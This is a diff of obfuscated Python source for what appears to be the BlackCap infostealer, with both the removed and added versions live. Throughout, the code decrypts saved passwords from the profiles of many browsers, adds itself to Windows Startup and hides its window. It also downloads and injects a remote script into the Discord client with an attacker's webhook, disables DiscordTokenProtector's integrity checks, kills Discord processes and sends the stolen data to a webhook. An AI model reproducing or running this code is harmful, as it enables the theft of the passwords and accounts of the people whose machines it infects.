+        lIIlllllllIlI.lIllllIIlIlIl = ntpath.join(lIIlllllllIlI.IlIlIIllIIll, 'Google', 'Chrome', 'User Data')
+        lIIlllllllIlI.IllllIlIllIllIIlll, lIIlllllllIlI.lIIllIlIlIIIIIlIII = mkdtemp(), gettempdir()
+        IIIIIIlIlllIIIIIll, llIIlIIlIIlIlIIIIl = lIIlllllllIlI.lIIlIllIII(), lIIlllllllIlI.llllIIlI()
+        lIIlllllllIlI.llIIIIllIll, lIIlllllllIlI.lIlIlllIIlII, lIIlllllllIlI.IIIIIIlIllI = IIIIIIlIlllIIIIIll[0], IIIIIIlIlllIIIIIll[1], IIIIIIlIlllIIIIIll[2]
+        lIIlllllllIlI.lIIlIlIllllIIIlIIIl, lIIlllllllIlI.IIIllllIllII, lIIlllllllIlI.IIlIIlIIl, lIIlllllllIlI.llIlIllIlIIIIll, lIIlllllllIlI.IIlIlIIIl, lIIlllllllIlI.IlllIIIl, lIIlllllllIlI.lIllIIll = llIIlIIlIIlIlIIIIl[0], llIIlIIlIIlIlIIIIl[1], llIIlIIlIIlIlIIIIl[2], llIIlIIlIIlIlIIIIl[3], llIIlIIlIIlIlIIIIl[4], llIIlIIlIIlIlIIIIl[5], llIIlIIlIIlIlIIIIl[6]
+        lIIlllllllIlI.lIIIlllllllIIIIllI = ntpath.join(lIIlllllllIlI.IllllllI, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        lIIlllllllIlI.lIIIllIIIlIllllIIll = "api/webhooks"
+        lIIlllllllIlI.llIIIIIlIIlll = re.compile(IlIIllIll'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
+        lIIlllllllIlI.IIlIlIIllIllIII = "https://discord.com/api/v9/users/@me"
+        lIIlllllllIlI.IllIIIllIlIl = IlIlIlllIIlIll
+        lIIlllllllIlI.IIlIIlIllllI = IlIIllIll"dQw4w9WgXcQ:[^\"]*"
+        lIIlllllllIlI.IIlIlllI = []
+        lIIlllllllIlI.lIIllIIllllll = []
+        lIIlllllllIlI.IIlllIIIlIlI = os.IIlllIIIlIlI;
+        lIIlllllllIlI.IIIIlIIIII = [];
+        lIIlllllllIlI.IllIIIIIIIIIIlllIII = lIIlllllllIlI.lllIlIIlIIIll(ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, "Local State"));
+        os.makedirs(lIIlllllllIlI.IllllIlIllIllIIlll, exist_ok=True);
+    def IlIIlIIIlllIlIIll(lIIlllllllIlI: str) -> str:
+        if lIIlllllllIlI.lllIIIIIIIIIIl == "yes":
             ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
-    def IIIIIllllllIIll(IIIIIIIllIllIIII: str) -> str:
-        IlIlIIlIIlIIlllIlIll = {
+    def IllllIII(lIIlllllllIlI: str) -> str:
+        llllIIIlIlI = {
             'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'content': "@everyone"
             }
-        IllIIllIll = {
+        llIllIlIl = {
             'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'content': "@here"
             }
-        if IIIIIIIllIllIIII.IIIIIllllIlII == "yes":
-            if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
-                if IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "@everyone" or IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "everyone":
-                    httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=IlIlIIlIIlIIlllIlIll)
-            if IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "@here" or IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "here":
-                if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl :
-                    httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=IllIIllIll)
-    def llIlIIlIIIlIl(IIIIIIIllIllIIII: str) -> str:
-        if IIIIIIIllIllIIII.IlIlllIlll == "yes":
-            IIIllIllIIIIlIl = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-            if os.lIllIIllI.exists(IIIllIllIIIIlIl + argv[0]):
-                os.remove(IIIllIllIIIIlIl + argv[0])
-                copy2(argv[0], IIIllIllIIIIlIl)
+        if lIIlllllllIlI.IIIlIIllIIlIlI == "yes":
+            if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
+                if lIIlllllllIlI.lIlIIlIIIlIlllll == "@everyone" or lIIlllllllIlI.lIlIIlIIIlIlllll == "everyone":
+                    httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=llllIIIlIlI)
+            if lIIlllllllIlI.lIlIIlIIIlIlllll == "@here" or lIIlllllllIlI.lIlIIlIIIlIlllll == "here":
+                if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll :
+                    httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=llIllIlIl)
+    def IIlIllllIIllIIll(lIIlllllllIlI: str) -> str:
+        if lIIlllllllIlI.lIlllIIlIIlIIlIIIIII == "yes":
+            IlIIIlllIIIlllIIIlII = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+            if os.lllIllIIlIlllllIIIIl.exists(IlIIIlllIIIlllIIIlII + argv[0]):
+                os.remove(IlIIIlllIIIlllIIIlII + argv[0])
+                copy2(argv[0], IlIIIlllIIIlllIIIlII)
             else:
-                copy2(argv[0], IIIllIllIIIIlIl)
-    def lIlIllIlIlIIlIII(IIIIIIIllIllIIII: str) -> str:
-        if IIIIIIIllIllIIII.lIllIlIIlIlllIIIIII == "yes":
-            lIllIlIIlIlllIIIIII = win32gui.GetForegroundWindow()
-            win32gui.ShowWindow(lIllIlIIlIlllIIIIII, win32con.SW_HIDE)
-    def IllllIII(IIIIIIIllIllIIII):
-        shutil.rmtree(IIIIIIIllIllIIII.llIIIIllIIl, ignore_errors=True)
+                copy2(argv[0], IlIIIlllIIIlllIIIlII)
+    def IllllIllIIIIll(lIIlllllllIlI: str) -> str:
+        if lIIlllllllIlI.IlIlIlIllIlIllI == "yes":
+            IlIlIlIllIlIllI = win32gui.GetForegroundWindow()
+            win32gui.ShowWindow(IlIlIlIllIlIllI, win32con.SW_HIDE)
+    def IlIllllIlIIlll(lIIlllllllIlI):
+        shutil.rmtree(lIIlllllllIlI.IllllIlIllIllIIlll, ignore_errors=True)
         os._exit(0)
-    def llIIllllIllIIllIlIll(IlllIlIIlIlIll):
-        def IlIIlllIIll(*lllIIIlIlllIlIl, **lllIllllllIlIl):
+    def llIIIlIlllIlllll(lllIIllI):
+        def IIlIIlIllll(*llIlIllIIlIIlIIIlIll, **lllllllIl):
             try:
-                IlllIlIIlIlIll(*lllIIIlIlllIlIl, **lllIllllllIlIl)
+                lllIIllI(*llIlIllIIlIIlIIIlIll, **lllllllIl)
             except Exception:
                 pass
-        return IlIIlllIIll
-    async def lIlIlIlIIllIlIllIIl(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IllIllIIIIl = {
-            'amigo': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Amigo\\User Data',
-            'torch': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Torch\\User Data',
-            'kometa': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Kometa\\User Data',
-            'orbitum': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Orbitum\\User Data',
-            'cent-browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CentBrowser\\User Data',
-            '7star': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\7Star\\7Star\\User Data',
-            'sputnik': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Sputnik\\Sputnik\\User Data',
-            'vivaldi': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome SxS\\User Data',
-            'google-chrome': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data',
-            'epic-privacy-browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Epic Privacy Browser\\User Data',
-            'microsoft-edge': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Microsoft\\Edge\\User Data',
-            'uran': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\uCozMedia\\Uran\\User Data',
-            'yandex': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Yandex\\YandexBrowser\\User Data',
-            'brave': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\BraveSoftware\\Brave-Browser\\User Data',
-            'iridium': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Iridium\\User Data',
-            'edge': IIIIIIIllIllIIII.IIllIlIlllIlI + "\\Microsoft\\Edge\\User Data",
-            'coccoc': IIIIIIIllIllIIII.IIllIlIlllIlI + "\\CocCoc\\Browser\\User Data"
+        return IIlIIlIllll
+    async def IlIlIllllIIIlI(lIIlllllllIlI):
+        lIIlllllllIlI.llIllIIIIIllll = {
+            'amigo': lIIlllllllIlI.IlIlIIllIIll + '\\Amigo\\User Data',
+            'torch': lIIlllllllIlI.IlIlIIllIIll + '\\Torch\\User Data',
+            'kometa': lIIlllllllIlI.IlIlIIllIIll + '\\Kometa\\User Data',
+            'orbitum': lIIlllllllIlI.IlIlIIllIIll + '\\Orbitum\\User Data',
+            'cent-browser': lIIlllllllIlI.IlIlIIllIIll + '\\CentBrowser\\User Data',
+            '7star': lIIlllllllIlI.IlIlIIllIIll + '\\7Star\\7Star\\User Data',
+            'sputnik': lIIlllllllIlI.IlIlIIllIIll + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': lIIlllllllIlI.IlIlIIllIIll + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': lIIlllllllIlI.IlIlIIllIIll + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': lIIlllllllIlI.IlIlIIllIIll + '\\Microsoft\\Edge\\User Data',
+            'uran': lIIlllllllIlI.IlIlIIllIIll + '\\uCozMedia\\Uran\\User Data',
+            'yandex': lIIlllllllIlI.IlIlIIllIIll + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': lIIlllllllIlI.IlIlIIllIIll + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': lIIlllllllIlI.IlIlIIllIIll + '\\Iridium\\User Data',
+            'edge': lIIlllllllIlI.IlIlIIllIIll + "\\Microsoft\\Edge\\User Data",
+            'coccoc': lIIlllllllIlI.IlIlIIllIIll + "\\CocCoc\\Browser\\User Data"
         }        
-        IIIIIIIllIllIIII.lIllIIIllllIII = [
+        lIIlllllllIlI.IlIlIlIIIIllIIIII = [
             'Default',
             'Profile 1',
             'Profile 2',
@@ -659,570 +350,570 @@ class IllIIllIllIIIlIlIIl(lIlIIIllIII):
             'Profile 14',
             'Profile 15',            
         ]
-        if IIIIIIIllIllIIII.lIllIIlIIIlIl == "" or self.discord_webhook == "\x57EBHOOK_HERE":
-            IIIIIIIllIllIIII.IllllIII()
-        IIIIIIIllIllIIII.lIlIllIlIlIIlIII()
-        IIIIIIIllIllIIII.lIIllIllI()
-        IIIIIIIllIllIIII.llIlIIlIIIlIl()
-        if IIIIIIIllIllIIII.lllllIIIll('dbugkiller') and IlIIllIlI().IlIllllIIIIIII is True:
-            IIIIIIIllIllIIII.IllllIII()
-        await IIIIIIIllIllIIII.IIIIIIlIII()
-        await IIIIIIIllIllIIII.IlIIIlllIIIIlIlllIl()
-        lIIIIlIllllIIllIII = [IIIIIIIllIllIIII.lIllIlIIll, IIIIIIIllIllIIII.lllllllIIllIIl, IIIIIIIllIllIIII.llllIIlIIIl, IIIIIIIllIllIIII.llIllIllIlII, IIIIIIIllIllIIII.lIllIIlIIIllIIIll]
-        if IIIIIIIllIllIIII.lllllIIIll('kill_discord_process'):
-            await IIIIIIIllIllIIII.lllIIIllIIlIIIlIlIII()
-        os.makedirs(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Browsers'), exist_ok=True)
-        for IllIlIIlIIllIlIIlIl, lIllIIllI in IIIIIIIllIllIIII.IllIllIIIIl.items():
-            if not os.lIllIIllI.isdir(lIllIIllI):
+        if lIIlllllllIlI.llllllIllllllIlIIll == "" or self.discord_webhook == "\x57EBHOOK_HERE":
+            lIIlllllllIlI.IlIllllIlIIlll()
+        lIIlllllllIlI.IllllIllIIIIll()
+        lIIlllllllIlI.IlIIlIIIlllIlIIll()
+        lIIlllllllIlI.IIlIllllIIllIIll()
+        if lIIlllllllIlI.lIllllIIIllIIllIIll('dbugkiller') and IIIIIlIIIllIlIllIIlI().lllllllI is True:
+            lIIlllllllIlI.IlIllllIlIIlll()
+        await lIIlllllllIlI.IIIIIlIIlIlIl()
+        await lIIlllllllIlI.lIllIIlIIlllIlIlIl()
+        IlIlIIlIIlllIIlIIl = [lIIlllllllIlI.lIIlllIIlI, lIIlllllllIlI.lllIIlIlII, lIIlllllllIlI.IIIIlllIl, lIIlllllllIlI.lIIIlIllIIllllIIllI, lIIlllllllIlI.IIlllIIlIIIII]
+        if lIIlllllllIlI.lIllllIIIllIIllIIll('kill_discord_process'):
+            await lIIlllllllIlI.IllllIIllI()
+        os.makedirs(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Browsers'), exist_ok=True)
+        for lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl in lIIlllllllIlI.llIllIIIIIllll.items():
+            if not os.lllIllIIlIlllllIIIIl.isdir(lllIllIIlIlllllIIIIl):
                 continue
-            IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI = IIIIIIIllIllIIII.lIlIIIllIIIIIlII(lIllIIllI + '\\Local State')
-            IIIIIIIllIllIIII.lllIIIlIllIllIIIllll = [
-                IIIIIIIllIllIIII.IIIlIlllIl,
-                IIIIIIIllIllIIII.llIlllIIllllIlIIIII,
-                IIIIIIIllIllIIII.IllIlIIll,
-                IIIIIIIllIllIIII.IlIlIllll
+            lIIlllllllIlI.IIIlIlIIIl = lIIlllllllIlI.lllIlIIlIIIll(lllIllIIlIlllllIIIIl + '\\Local State')
+            lIIlllllllIlI.IIlIIllIlIl = [
+                lIIlllllllIlI.lIlllIIlIl,
+                lIIlllllllIlI.lIIIlIIIllIllIlIl,
+                lIIlllllllIlI.IIllllllIIllIl,
+                lIIlllllllIlI.llIIIIIlIlIlIIIllIl
             ]
-            for IllIIlllIlI in IIIIIIIllIllIIII.lIllIIIllllIII:
-                for IlllIlIIlIlIll in IIIIIIIllIllIIII.lllIIIlIllIllIIIllll:
+            for IlllIIlllIllllIIII in lIIlllllllIlI.IlIlIlIIIIllIIIII:
+                for lllIIllI in lIIlllllllIlI.IIlIIllIlIl:
                     try:
-                        IlllIlIIlIlIll(IllIlIIlIIllIlIIlIl, lIllIIllI, IllIIlllIlI)
+                        lllIIllI(lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl, IlllIIlllIllllIIII)
                     except:
                         pass
-        if ntpath.exists(IIIIIIIllIllIIII.llIlIlIllIlIII) and IIIIIIIllIllIIII.IIllllIllIIIlI is not None:
-            os.makedirs(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google'), exist_ok=True)
-            lIIIIlIllllIIllIII.extend([IIIIIIIllIllIIII.lIllllIIIllIIlIII, IIIIIIIllIllIIII.lIIllIlIIlllIII, IIIIIIIllIllIIII.IIlIIlIII])
-        for IlllIlIIlIlIll in lIIIIlIllllIIllIII:
-            IllllIIllIlIlI = threading.Thread(IIllIIlIlllII=IlllIlIIlIlIll, daemon=True)
-            IllllIIllIlIlI.start()
-        for IIIIIIIll in threading.enumerate():
+        if ntpath.exists(lIIlllllllIlI.lIllllIIlIlIl) and lIIlllllllIlI.IllIIIIIIIIIIlllIII is not None:
+            os.makedirs(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google'), exist_ok=True)
+            IlIlIIlIIlllIIlIIl.extend([lIIlllllllIlI.IlIlllIllllIllIIlIlI, lIIlllllllIlI.lIIlllIlllIll, lIIlllllllIlI.lIllIIlIIlIlIIllI])
+        for lllIIllI in IlIlIIlIIlllIIlIIl:
+            IIlIIlllII = threading.Thread(llIlIIllIIIl=lllIIllI, daemon=True)
+            IIlIIlllII.start()
+        for lIllIIllIlIIII in threading.enumerate():
             try:
-                IIIIIIIll.join()
+                lIllIIllIlIIII.join()
             except RuntimeError:
                 continue
-        IIIIIIIllIllIIII.llIIlIlI()
-        await IIIIIIIllIllIIII.IIIllIIl()
-        IIIIIIIllIllIIII.IIIIIllllllIIll()
-        IIIIIIIllIllIIII.llIIIlIIIIllIlIIl()
-    async def IIIllIIl(IIIIIIIllIllIIII):
-        for lIlIIIlIlllll in os.listdir(IIIIIIIllIllIIII.IIllIlIlllIlI):
-            if 'discord' in lIlIIIlIlllll.lower():
-                IIIIlllIlIIIllIIl = IIIIIIIllIllIIII.IIllIlIlllIlI + os.lIIIllIllllII + lIlIIIlIlllll
-                for lIllIlIIIllIllIll in os.listdir(ntpath.abspath(IIIIlllIlIIIllIIl)):
-                    if re.match(IIlllIIlIlIlI'app-(\d*\.\d*)*', lIllIlIIIllIllIll):
-                        IIIllllIll = ntpath.abspath(ntpath.join(IIIIlllIlIIIllIIl, lIllIlIIIllIllIll))
-                        IIlIlllIlIllIIIlll = ntpath.join(IIIllllIll, 'modules')
-                        if not ntpath.exists(IIlIlllIlIllIIIlll):
+        lIIlllllllIlI.IIIIllIll()
+        await lIIlllllllIlI.lIIllIllIIlIIlIllII()
+        lIIlllllllIlI.IllllIII()
+        lIIlllllllIlI.IlIIIIll()
+    async def lIIllIllIIlIIlIllII(lIIlllllllIlI):
+        for IlIlIIIllIIllIl in os.listdir(lIIlllllllIlI.IlIlIIllIIll):
+            if 'discord' in IlIlIIIllIIllIl.lower():
+                lIllIIlIllIIIl = lIIlllllllIlI.IlIlIIllIIll + os.IIlllIIIlIlI + IlIlIIIllIIllIl
+                for lIlIIlIIlIl in os.listdir(ntpath.abspath(lIllIIlIllIIIl)):
+                    if re.match(IlIIllIll'app-(\d*\.\d*)*', lIlIIlIIlIl):
+                        IIIlllIlIIIllII = ntpath.abspath(ntpath.join(lIllIIlIllIIIl, lIlIIlIIlIl))
+                        lllIIlll = ntpath.join(IIIlllIlIIIllII, 'modules')
+                        if not ntpath.exists(lllIIlll):
                             return
-                        for IIIIlIlll in os.listdir(IIlIlllIlIllIIIlll):
-                            if re.match(IIlllIIlIlIlI"discord_desktop_core-\d+", IIIIlIlll):
-                                lIIIIllIlIIllI = IIlIlllIlIllIIIlll + os.lIIIllIllllII + IIIIlIlll + lIIIIllIlIIIllIIl'\\discord_desktop_core\\'
-                                if ntpath.exists(lIIIIllIlIIllI):
-                                    if IIIIIIIllIllIIII.llllIIIIllIlIIlIIIII not in argv[0]:
+                        for lllIIlIIlIlll in os.listdir(lllIIlll):
+                            if re.match(IlIIllIll"discord_desktop_core-\d+", lllIIlIIlIlll):
+                                llIIlllIlIIII = lllIIlll + os.IIlllIIIlIlI + lllIIlIIlIlll + llllIlIlll'\\discord_desktop_core\\'
+                                if ntpath.exists(llIIlllIlIIII):
+                                    if lIIlllllllIlI.lIIIlllllllIIIIllI not in argv[0]:
                                         try:
-                                            os.makedirs(lIIIIllIlIIllI + 'blackcap', exist_ok=True)
+                                            os.makedirs(llIIlllIlIIII + 'blackcap', exist_ok=True)
                                         except PermissionError:
                                             pass
-                                    if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
-                                        lIIIIllIlIIIllIIl = httpx.get(IIIIIIIllIllIIII.lllllIIIll('blackcap_inject_url')).text.replace("%WEBHOOK%", IIIIIIIllIllIIII.lIllIIlIIIlIl)
+                                    if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
+                                        llllIlIlll = httpx.get(lIIlllllllIlI.lIllllIIIllIIllIIll('blackcap_inject_url')).text.replace("%WEBHOOK%", lIIlllllllIlI.llllllIllllllIlIIll)
                                     try:
-                                        with open(lIIIIllIlIIllI + 'index.js', 'w', errors="ignore") as IIIIIllIllllIIlll:
-                                            IIIIIllIllllIIlll.write(lIIIIllIlIIIllIIl)
+                                        with open(llIIlllIlIIII + 'index.js', 'w', errors="ignore") as llIlIlIIllIll:
+                                            llIlIlIIllIll.write(llllIlIlll)
                                     except PermissionError:
                                         pass
-                                    if IIIIIIIllIllIIII.lllllIIIll('kill_discord_process'):
-                                        os.startfile(IIIllllIll + IIIIIIIllIllIIII.lIIIllIllllII + lIlIIIlIlllll + '.exe')
-    async def IlIIIlllIIIIlIlllIl(IIIIIIIllIllIIII):
-        lllIlllIlllI = lIIIIllIlIIIllIIl"{sIIlIlIIIlIlIIlIIllIIIIllIlIIIllIIl.IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}\\DiscordTokenProtector\\"
-        if not ntpath.exists(lllIlllIlllI):
+                                    if lIIlllllllIlI.lIllllIIIllIIllIIll('kill_discord_process'):
+                                        os.startfile(IIIlllIlIIIllII + lIIlllllllIlI.IIlllIIIlIlI + IlIlIIIllIIllIl + '.exe')
+    async def lIllIIlIIlllIlIlIl(lIIlllllllIlI):
+        IIIlIlIlllIIIIll = llllIlIlll"{lIIlllllllIlI.IlIIllIllolIlIlIIIlIlllIlllIImlIlIllllIllIlIIlIIIlIIllIlIlllIllIIIng}\\DiscordTokenProtector\\"
+        if not ntpath.exists(IIIlIlIlllIIIIll):
             return
-        lIIIIllllllIl = lllIlllIlllI + "config.json"
-        for lIIllllllIl in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+        IIIIIllIIIl = IIIlIlIlllIIIIll + "config.json"
+        for lIlIllllIllIlIIllII in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
-                os.remove(lllIlllIlllI + lIIllllllIl)
+                os.remove(IIIlIlIlllIIIIll + lIlIllllIllIlIIllII)
             except FileNotFoundError:
                 pass
-        if ntpath.exists(lIIIIllllllIl):
-            with open(lIIIIllllllIl, errors="ignore") as lIIIIllIlIIIllIIl:
+        if ntpath.exists(IIIIIllIIIl):
+            with open(IIIIIllIIIl, errors="ignore") as llllIlIlll:
                 try:
-                    IIIlIlIIlIllIIIIIlll = json.load(lIIIIllIlIIIllIIl)
+                    lllIIIIlIllIIl = json.load(llllIlIlll)
                 except json.decoder.JSONDecodeError:
                     return
-                IIIlIlIIlIllIIIIIlll['ksch_is_here'] = "https://github.com/asd"
-                IIIlIlIIlIllIIIIIlll['auto_start'] = False
-                IIIlIlIIlIllIIIIIlll['auto_start_discord'] = False
-                IIIlIlIIlIllIIIIIlll['integrity'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_allowbetterdiscord'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_checkexecutable'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_checkhash'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_checkmodule'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_checkscripts'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_checkresource'] = False
-                IIIlIlIIlIllIIIIIlll['integrity_redownloadhashes'] = False
-                IIIlIlIIlIllIIIIIlll['iterations_iv'] = 364
-                IIIlIlIIlIllIIIIIlll['iterations_key'] = 457
-                IIIlIlIIlIllIIIIIlll['version'] = 69420
-            with open(lIIIIllllllIl, 'w') as lIIIIllIlIIIllIIl:
-                json.dump(IIIlIlIIlIllIIIIIlll, lIIIIllIlIIIllIIl, indent=2, sort_keys=True)
-            with open(lIIIIllllllIl, 'a') as lIIIIllIlIIIllIIl:
-                lIIIIllIlIIIllIIl.write("\n\n//KSCH_is_here | https://github.com/asd")
-    async def lllIIIllIIlIIIlIlIII(IIIIIIIllIllIIII):
-        IlIllIlIlIIlIIlI = IIIIIIIllIllIIII.lllllIIIll('blprggg')
-        for lIIllllllIl in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
-            IlIllIlIlIIlIIlI.append(lIIllllllIl)
-        for IIIIIllIIlIIll in psutil.process_iter():
-            if any(llIIlllIllI in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower() for llIIlllIllI in IlIllIlIlIIlIIlI):
+                lllIIIIlIllIIl['ksch_is_here'] = "https://github.com/asd"
+                lllIIIIlIllIIl['auto_start'] = False
+                lllIIIIlIllIIl['auto_start_discord'] = False
+                lllIIIIlIllIIl['integrity'] = False
+                lllIIIIlIllIIl['integrity_allowbetterdiscord'] = False
+                lllIIIIlIllIIl['integrity_checkexecutable'] = False
+                lllIIIIlIllIIl['integrity_checkhash'] = False
+                lllIIIIlIllIIl['integrity_checkmodule'] = False
+                lllIIIIlIllIIl['integrity_checkscripts'] = False
+                lllIIIIlIllIIl['integrity_checkresource'] = False
+                lllIIIIlIllIIl['integrity_redownloadhashes'] = False
+                lllIIIIlIllIIl['iterations_iv'] = 364
+                lllIIIIlIllIIl['iterations_key'] = 457
+                lllIIIIlIllIIl['version'] = 69420
+            with open(IIIIIllIIIl, 'w') as llllIlIlll:
+                json.dump(lllIIIIlIllIIl, llllIlIlll, indent=2, sort_keys=True)
+            with open(IIIIIllIIIl, 'a') as llllIlIlll:
+                llllIlIlll.write("\n\n//KSCH_is_here | https://github.com/asd")
+    async def IllllIIllI(lIIlllllllIlI):
+        IIllllIlIlIlIIII = lIIlllllllIlI.lIllllIIIllIIllIIll('blprggg')
+        for lIlIllllIllIlIIllII in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
+            IIllllIlIlIlIIII.append(lIlIllllIllIlIIllII)
+        for llIIllIlIlII in psutil.process_iter():
+            if any(IIlIIlIIIlI in llIIllIlIlII.lIIlllIlIlIIlII().lower() for IIlIIlIIIlI in IIllllIlIlIlIIII):
                 try:
-                    IIIIIllIIlIIll.kill()
+                    llIIllIlIlII.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-    async def IIIIIIlIII(IIIIIIIllIllIIII):
-        lIIIIlIIlIllIIlII = IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\BetterDiscord\\data\\betterdiscord.asar"
-        if ntpath.exists(lIIIIlIIlIllIIlII):
-            llIllIlIllIllllll = IIIIIIIllIllIIII.IlIlIlIIlllllIl
-            with open(lIIIIlIIlIllIIlII, 'r', encoding="cp437", errors='ignore') as lIIIIllIlIIIllIIl:
-                llIIlIIIIIIIlI = lIIIIllIlIIIllIIl.read()
-                IIlIIIlIIIIlIllllIII = llIIlIIIIIIIlI.replace(llIllIlIllIllllll, 'KSCHishere')
-            with open(lIIIIlIIlIllIIlII, 'w', newline='', encoding="cp437", errors='ignore') as lIIIIllIlIIIllIIl:
-                lIIIIllIlIIIllIIl.write(IIlIIIlIIIIlIllllIII)
-    @llIIllllIllIIllIlIll
-    def lIlIIlllIIlIllII(IIIIIIIllIllIIII, llllIllIllIllIIllI, lllIIIlIlIlIIllI):
+    async def IIIIIlIIlIlIl(lIIlllllllIlI):
+        lIlIllIlllI = lIIlllllllIlI.IllllllI + "\\BetterDiscord\\data\\betterdiscord.asar"
+        if ntpath.exists(lIlIllIlllI):
+            lIllllIlIl = lIIlllllllIlI.lIIIllIIIlIllllIIll
+            with open(lIlIllIlllI, 'r', encoding="cp437", errors='ignore') as llllIlIlll:
+                IIIIIIlllll = llllIlIlll.read()
+                lIllIIlIlllIlIIIlIlI = IIIIIIlllll.replace(lIllllIlIl, 'KSCHishere')
+            with open(lIlIllIlllI, 'w', newline='', encoding="cp437", errors='ignore') as llllIlIlll:
+                llllIlIlll.write(lIllIIlIlllIlIIIlIlI)
+    @llIIIlIlllIlllll
+    def IIlIllIIIllllIII(lIIlllllllIlI, IllIlIIIIIIlll, IIlIllIllIIlIII):
         try:
-            IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
-            llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
-            llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
-            lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
-            lllIIlll = lllIIlll[:-16].decode()
-            return lllIIlll
+            IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
+            llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
+            IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
+            IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
+            IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
+            return IIIlllIllIlIIllll
         except Exception:
             return "Failed to decrypt password"
-    def IIIllIlIIlll(IIIIIIIllIllIIII, lIllIIllI):
-        with open(lIllIIllI, "r", encoding="utf-8") as lIIIIllIlIIIllIIl:
-            IlIlIIlllllIlIlI = lIIIIllIlIIIllIIl.read()
-        IllIllIlllIllll = json.loads(IlIlIIlllllIlIlI)
-        lllIIIlIlIlIIllI = base64.b64decode(IllIllIlllIllll["os_crypt"]["encrypted_key"])
-        lllIIIlIlIlIIllI = lllIIIlIlIlIIllI[5:]
